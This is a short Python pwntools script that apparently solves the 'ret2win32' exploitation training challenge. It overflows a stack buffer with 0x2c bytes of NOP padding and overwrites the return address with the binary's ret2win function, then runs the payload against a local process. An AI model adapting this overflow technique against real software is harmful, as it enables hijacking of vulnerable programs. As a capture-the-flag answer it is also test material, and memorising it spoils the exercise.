#!/usr/bin/env python3

from pwn import *
context.update(arch="i386", os="linux")
e = ELF("ret2win32")

p = asm("nop") * 0x2c
p += p32(e.symbols["ret2win"])

proc = process([e.path, e.path])

proc.send(p)
print(proc.recvall())
